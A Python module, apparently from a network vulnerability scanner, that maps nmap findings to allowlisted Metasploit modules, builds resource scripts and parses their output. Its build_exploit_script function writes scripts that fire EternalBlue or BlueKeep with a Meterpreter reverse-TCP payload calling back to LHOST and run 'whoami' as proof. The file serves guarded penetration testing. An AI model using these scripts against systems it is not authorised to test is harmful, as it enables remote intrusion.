"""Catalogo de modulos de Metasploit y traduccion de hallazgos a modulos.

La filosofia es la misma que la de los perfiles NSE 'safe': por defecto solo se
usan modulos `auxiliary/scanner/*` (enumeracion no intrusiva) y el metodo
`check` de algunos exploits bien conocidos. `check` interroga al objetivo para
decidir si es explotable, pero NO lanza payload: es la diferencia entre
comprobar y explotar, igual que 'not exploit' en el selector NSE.

Este modulo es puro (sin subprocesos): construye el texto del resource script y
clasifica la salida. Asi se puede testear sin tener Metasploit instalado.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field

# --- Clasificacion de resultados ---------------------------------------------

VULNERABLE = "vulnerable"  # check/scanner afirma explotable
LIKELY = "likely"  # "appears"/"likely": probable, sin certeza
SAFE = "safe"  # el objetivo no es vulnerable por esta via
UNKNOWN = "unknown"  # el modulo no pudo decidir
ERROR = "error"  # el modulo fallo al ejecutarse

# Resultados de la fase de explotacion (no de check).
PREPARED = "prepared"  # resource script generado para ejecucion manual
EXPLOITED = "exploited"  # el exploit abrio sesion / probo ejecucion
FAILED = "failed"  # el exploit se lanzo pero no abrio sesion

# Orden de preferencia al resumir varios indicios para un mismo host.
_RANK = {ERROR: 0, SAFE: 1, UNKNOWN: 2, LIKELY: 3, VULNERABLE: 4}


@dataclass(frozen=True)
class MsfModule:
    path: str
    kind: str  # "scanner" | "exploit"
    label: str
    # CVEs que justifican lanzar este modulo. Vacio = aplica por servicio/puerto.
    cves: tuple[str, ...] = field(default=())
    # Payload por defecto al EXPLOTAR (solo modulos exploit). Se elige uno
    # multiplataforma/estable; el usuario puede cambiarlo via MEDSCAN_MSF_PAYLOAD.
    payload: str = ""
    prerequisites: str = ""
    safety_note: str = ""

    @property
    def action(self) -> str:
        """Lo que se ordena en el resource script de VERIFICACION.

        Los scanner se ejecutan con `run`; los exploit solo con `check`, nunca
        con `exploit`: la verificacion comprueba explotabilidad, no explota. La
        explotacion real es una fase aparte y explicita (build_exploit_script).
        """
        return "run" if self.kind == "scanner" else "check"

    @property
    def exploitable(self) -> bool:
        """True si este modulo admite la fase de explotacion desde el panel."""
        return self.kind == "exploit" and bool(self.payload)


# Modulos ligados a un servicio detectado por nmap (service name de nmap).
# Solo enumeracion no intrusiva.
_BY_SERVICE: dict[str, tuple[MsfModule, ...]] = {
    "ssh": (MsfModule("auxiliary/scanner/ssh/ssh_version", "scanner", "Version de SSH"),),
    "ftp": (
        MsfModule("auxiliary/scanner/ftp/ftp_version", "scanner", "Version de FTP"),
        MsfModule("auxiliary/scanner/ftp/anonymous", "scanner", "FTP con acceso anonimo"),
    ),
    "telnet": (
        MsfModule("auxiliary/scanner/telnet/telnet_version", "scanner", "Version de Telnet"),
    ),
    "smtp": (MsfModule("auxiliary/scanner/smtp/smtp_version", "scanner", "Version de SMTP"),),
    "http": (MsfModule("auxiliary/scanner/http/http_version", "scanner", "Version de HTTP"),),
    "https": (MsfModule("auxiliary/scanner/http/http_version", "scanner", "Version de HTTP/TLS"),),
    "microsoft-ds": (
        MsfModule("auxiliary/scanner/smb/smb_version", "scanner", "Version de SMB/dialecto"),
    ),
    "netbios-ssn": (
        MsfModule("auxiliary/scanner/smb/smb_version", "scanner", "Version de SMB/dialecto"),
    ),
    "mysql": (MsfModule("auxiliary/scanner/mysql/mysql_version", "scanner", "Version de MySQL"),),
    "postgresql": (
        MsfModule("auxiliary/scanner/postgres/postgres_version", "scanner", "Version de PostgreSQL"),
    ),
    "vnc": (
        MsfModule("auxiliary/scanner/vnc/vnc_none_auth", "scanner", "VNC sin autenticacion"),
    ),
    "ms-wbt-server": (
        MsfModule("auxiliary/scanner/rdp/rdp_scanner", "scanner", "RDP: info del servicio"),
    ),
}

# Modulos de verificacion (`check`) ligados a un CVE concreto. Se activan solo
# si el escaneo (NSE/NVD) ya apunta a ese CVE en el host.
_BY_CVE: tuple[MsfModule, ...] = (
    MsfModule(
        "exploit/windows/smb/ms17_010_eternalblue",
        "exploit",
        "MS17-010 / EternalBlue",
        cves=("CVE-2017-0143", "CVE-2017-0144", "CVE-2017-0145", "CVE-2017-0148"),
        payload="windows/x64/meterpreter/reverse_tcp",
        prerequisites="SMB accesible y veredicto MSF vulnerable/likely en el mismo host:puerto.",
        safety_note="Modulo allowlist; por defecto solo se prepara .rc para ejecucion manual.",
    ),
    MsfModule(
        "exploit/windows/rdp/cve_2019_0708_bluekeep",
        "exploit",
        "BlueKeep",
        cves=("CVE-2019-0708",),
        payload="windows/x64/meterpreter/reverse_tcp",
        prerequisites="RDP accesible y check BlueKeep vulnerable/likely.",
        safety_note="Modulo allowlist; requiere confirmar estabilidad del laboratorio antes de ejecutar.",
    ),
    MsfModule(
        "auxiliary/scanner/ssl/openssl_heartbleed",
        "scanner",
        "Heartbleed (OpenSSL)",
        cves=("CVE-2014-0160",),
    ),
)


def _norm_cves(cves: list[str] | tuple[str, ...]) -> set[str]:
    return {c.strip().upper() for c in cves if c and c.strip()}


def module_by_path(path: str) -> MsfModule | None:
    """Busca un modulo del catalogo por su path. None si no esta.

    Solo se puede explotar lo que el catalogo conoce: esto impide que el panel
    ejecute un path arbitrario llegado por parametro.
    """
    for mods in _BY_SERVICE.values():
        for mod in mods:
            if mod.path == path:
                return mod
    for mod in _BY_CVE:
        if mod.path == path:
            return mod
    return None


def catalog() -> list[MsfModule]:
    """Catalogo completo allowlistado, en orden estable para CLI/panel/report."""
    rows: dict[str, MsfModule] = {}
    for mods in _BY_SERVICE.values():
        for mod in mods:
            rows[mod.path] = mod
    for mod in _BY_CVE:
        rows[mod.path] = mod
    return sorted(rows.values(), key=lambda mod: (mod.kind, mod.path))


def exploitable_catalog() -> list[MsfModule]:
    """Modulos que pueden llegar a preparar/ejecutar exploit con guardas."""
    return [mod for mod in catalog() if mod.exploitable]


def candidates_for(
    *, service_name: str, product: str, cve_ids: list[str] | tuple[str, ...] = ()
) -> list[MsfModule]:
    """Modulos aplicables a un puerto abierto.

    `service_name` es el que reporta nmap (p.ej. 'microsoft-ds'); `cve_ids` son
    los CVE que el escaneo ya asocio a ese host/puerto (NSE o NVD).
    """
    found: dict[str, MsfModule] = {}
    for mod in _BY_SERVICE.get(service_name.strip().lower(), ()):  # por servicio
        found[mod.path] = mod

    cves = _norm_cves(cve_ids)
    if cves:
        for mod in _BY_CVE:  # por CVE confirmado/candidato
            if cves & set(mod.cves):
                found[mod.path] = mod

    return list(found.values())


# --- Construccion del resource script ----------------------------------------


def build_resource_script(module: MsfModule, hosts: list[str], *, rport: int | None = None) -> str:
    """Resource script (.rc) que ejecuta `module` contra `hosts`.

    Se agrupan varios RHOSTS en una sola invocacion para no pagar el arranque de
    msfconsole por cada host. `spool`/el prefijo host:port permiten atribuir
    cada linea de salida a su host al parsear.

    No se define ningun PAYLOAD ni se usa `exploit`: la accion es `run` (scanner)
    o `check` (exploit), nunca el disparo del exploit.
    """
    if not hosts:
        raise ValueError("No hay hosts para el resource script")

    lines = [
        "setg ConsoleLogging true",
        "setg VERBOSE true",
        f"use {module.path}",
        f"setg RHOSTS {' '.join(hosts)}",
    ]
    if rport is not None:
        lines.append(f"set RPORT {rport}")
    lines.append(module.action)  # run | check
    lines.append("exit -y")
    return "\n".join(lines) + "\n"


def build_exploit_script(
    module: MsfModule,
    host: str,
    *,
    rport: int | None,
    lhost: str,
    lport: int = 4444,
    payload: str = "",
    proof_cmd: str = "whoami",
) -> str:
    """Resource script que LANZA el exploit contra un unico host.

    A diferencia de build_resource_script (que solo hace check/run), aqui se fija
    un PAYLOAD y se ejecuta `exploit`. Para no dejar una sesion interactiva colgada
    en un hilo del panel:

      - `exploit -z` no entra en la sesion (queda en segundo plano).
      - tras una espera, `sessions -C <cmd>` corre un comando de prueba (p.ej.
        whoami) que sirve de evidencia de ejecucion remota.
      - `sessions -K` cierra todas las sesiones antes de salir.

    RHOSTS se fija a un solo host: la explotacion nunca es masiva.
    """
    if not host:
        raise ValueError("La explotacion exige un host concreto")
    if module.kind != "exploit":
        raise ValueError(f"{module.path} no es un modulo de explotacion")

    chosen_payload = payload or module.payload
    if not chosen_payload:
        raise ValueError(f"{module.path} no tiene payload definido")

    lines = [
        "setg ConsoleLogging true",
        "setg VERBOSE true",
        "setg ExitOnSession false",
        f"use {module.path}",
        f"setg RHOSTS {host}",
    ]
    if rport is not None:
        lines.append(f"set RPORT {rport}")
    lines += [
        f"set PAYLOAD {chosen_payload}",
        f"set LHOST {lhost}",
        f"set LPORT {lport}",
        "exploit -z",
        "sleep 15",
        "sessions -l",
        f'sessions -C "{proof_cmd}"',
        "sleep 3",
        "sessions -K",
        "exit -y",
    ]
    return "\n".join(lines) + "\n"


# Marcadores de que el exploit abrio sesion (exito) o no.
_SESSION_OPEN = (
    "meterpreter session",
    "command shell session",
    "session 1 opened",
    "session opened",
)
_NO_SESSION = (
    "exploit completed, but no session was created",
    "exploit failed",
    "the target is not exploitable",
)


def parse_exploit_output(text: str) -> tuple[str, str]:
    """Clasifica la salida de un `exploit`. Devuelve (resultado, evidencia).

    resultado es EXPLOITED si se abrio sesion, FAILED si se completo sin sesion,
    o ERROR si ni siquiera llego a lanzarse. La evidencia son las lineas
    relevantes (sesion abierta y salida del comando de prueba).
    """
    low = text.lower()
    opened = any(m in low for m in _SESSION_OPEN) or bool(
        re.search(r"session\s+\d+\s+opened", low)
    )
    no_session = any(m in low for m in _NO_SESSION)

    evidence_lines = [
        ln.strip()
        for ln in text.splitlines()
        if re.search(r"session\s+\d+\s+opened", ln, re.IGNORECASE)
        or ln.strip().lower().startswith(("[+]", "nt authority", "root@", "whoami"))
        or "no session was created" in ln.lower()
    ]
    evidence = "\n".join(evidence_lines[:12]).strip()

    if opened:
        return EXPLOITED, evidence or "Sesion abierta en el objetivo."
    if no_session:
        return FAILED, evidence or "El exploit se completo sin abrir sesion."
    if not text.strip():
        return ERROR, "Sin salida de msfconsole."
    return FAILED, evidence or "No se detecto sesion; revisa el log del modulo."


# --- Clasificacion de la salida ----------------------------------------------

# Prefijo tipico de msfconsole: "[+] 10.0.0.5:445    - mensaje".
_LINE_RE = re.compile(
    r"^\[(?P<glyph>[+\-*!])\]\s+(?P<host>\d{1,3}(?:\.\d{1,3}){3}|[0-9a-fA-F:]+)"
    r"(?::(?P<port>\d+))?\s*-?\s*(?P<msg>.*)$"
)

_SAFE_MARKERS = (
    "is not vulnerable",
    "not be exploitable",
    "not exploitable",
    "does not appear to be vulnerable",
    "target is not",
)
_VULN_MARKERS = (
    "is vulnerable",
    "host is likely vulnerable",
    "target is vulnerable",
    "vulnerable to ms17-010",
)
_LIKELY_MARKERS = (
    "appears to be vulnerable",
    "likely vulnerable",
    "may be vulnerable",
)
_UNKNOWN_MARKERS = (
    "cannot reliably check",
    "unable to",
    "could not connect",
    "no response",
)


def _classify_message(msg: str) -> str | None:
    low = msg.lower()
    if any(m in low for m in _SAFE_MARKERS):  # el negativo primero: "not vulnerable"
        return SAFE
    if any(m in low for m in _VULN_MARKERS):
        return VULNERABLE
    if any(m in low for m in _LIKELY_MARKERS):
        return LIKELY
    if any(m in low for m in _UNKNOWN_MARKERS):
        return UNKNOWN
    return None


@dataclass
class HostVerdict:
    host: str
    port: int | None
    result: str
    detail: str


def parse_output(text: str, *, default_hosts: list[str] | None = None) -> dict[str, HostVerdict]:
    """Resume la salida de un modulo en un veredicto por host.

    Si varias lineas hablan del mismo host, gana la de mayor rango (vulnerable >
    likely > unknown > safe). Devuelve {host: HostVerdict}.
    """
    verdicts: dict[str, HostVerdict] = {}
    for raw in text.splitlines():
        match = _LINE_RE.match(raw.strip())
        if not match:
            continue
        result = _classify_message(match.group("msg"))
        if result is None:
            continue
        host = match.group("host")
        port = int(match.group("port")) if match.group("port") else None
        prev = verdicts.get(host)
        if prev is None or _RANK[result] > _RANK[prev.result]:
            verdicts[host] = HostVerdict(host, port, result, match.group("msg").strip())

    # Hosts sobre los que el modulo no dijo nada clasificable: quedan UNKNOWN.
    for host in default_hosts or []:
        verdicts.setdefault(host, HostVerdict(host, None, UNKNOWN, "Sin veredicto del modulo"))
    return verdicts
